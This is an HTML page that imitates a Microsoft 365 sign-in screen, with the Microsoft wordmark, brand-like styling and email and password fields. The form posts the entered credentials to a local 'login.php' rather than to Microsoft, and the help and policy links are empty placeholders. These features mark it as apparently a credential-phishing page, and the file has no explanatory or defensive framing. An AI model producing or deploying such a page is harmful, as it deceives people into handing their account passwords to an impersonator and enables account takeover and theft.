<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', 'Helvetica Neue', 'Lucida Grande', Arial, sans-serif;
            background: #f0f0f0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .card {
            background: white; box-shadow: 0 2px 6px rgba(0,0,0,0.2); border-radius: 4px;
            padding: 44px; max-width: 440px; width: 100%;
        }
        .logo { margin-bottom: 24px; }
        .logo svg { width: 108px; height: 24px; }
        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 12px; }
        .subtitle { font-size: 14px; color: #1b1b1b; margin-bottom: 24px; }
        .input-group { margin-bottom: 16px; }
        .input-group input {
            width: 100%; padding: 6px 10px; border: 1px solid #8c8c8c; border-radius: 2px;
            font-size: 15px; height: 36px; color: #1b1b1b;
        }
        .input-group input:focus { border-color: #0067b8; outline: none; box-shadow: 0 0 0 1px #0067b8; }
        .input-group label { display: block; font-size: 13px; color: #1b1b1b; margin-bottom: 4px; }
        .checkbox-group { display: flex; align-items: center; gap: 8px; margin-bottom: 24px; font-size: 13px; color: #1b1b1b; }
        .submit-btn {
            float: right; padding: 6px 24px; background: #0067b8; color: white; border: none;
            border-radius: 2px; font-size: 15px; cursor: pointer; min-width: 108px; height: 32px;
        }
        .submit-btn:hover { background: #005da6; }
        .footer-links { margin-top: 40px; font-size: 12px; }
        .footer-links a { color: #0067b8; text-decoration: none; margin-right: 16px; }
        .footer-links a:hover { text-decoration: underline; }
        .error { color: #e81123; font-size: 12px; margin-top: 4px; display: none; }
        .kmsi { font-size: 13px; color: #1b1b1b; margin-top: 16px; }
        .kmsi a { color: #0067b8; text-decoration: none; }
        .kmsi a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
                <text x="0" y="20" font-family="Segoe UI, sans-serif" font-size="20" font-weight="600" fill="#0067b8">Microsoft</text>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Microsoft 365</p>
        <form action="login.php" method="POST">
            <div class="input-group">
                <label for="username">Email, phone, or Skype</label>
                <input type="text" id="username" name="username" placeholder="someone@example.com" required autofocus>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <div class="checkbox-group">
                <input type="checkbox" id="kmsi" checked>
                <label for="kmsi">Keep me signed in</label>
            </div>
            <button type="submit" class="submit-btn">Sign in</button>
            <div style="clear: both;"></div>
        </form>
        <div class="kmsi">
            <a href="#">Forgot my password</a><br>
            <a href="#">Sign in with a different account</a>
        </div>
        <div class="footer-links">
            <a href="#">Terms of use</a>
            <a href="#">Privacy & cookies</a>
        </div>
    </div>
</body>
</html>
